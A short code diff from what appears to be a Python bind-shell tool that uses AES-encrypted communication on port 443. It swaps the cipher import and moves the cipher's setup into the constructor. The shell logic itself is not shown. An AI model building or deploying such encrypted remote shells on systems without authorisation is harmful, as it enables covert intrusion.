@@ -5,15 +5,14 @@ import platform
 import threading
 import subprocess
 
-from aes_cipher import AESCipher
+from aes_pycryptodome import AESCipher
 
 DEFAULT_PORT = 443
 MAX_BUFFER = 4096
 
 class BindShell:
     def __init__(self):
-        # An instance of the AESCipher class
-        self.aes = None
+        self.aes = AESCipher()
 
     def encrypted_send(self, s, msg):
         """Send an AES-encrypted message."""
@@ -128,7 +127,6 @@ class BindShell:
         threading.Thread(target=self.recv_thread, args=(s,)).start()
 
     def run(self):
-        self.aes = AESCipher()
         parser = argparse.ArgumentParser()
 
         # Usage: python3 bind_shell.py -l
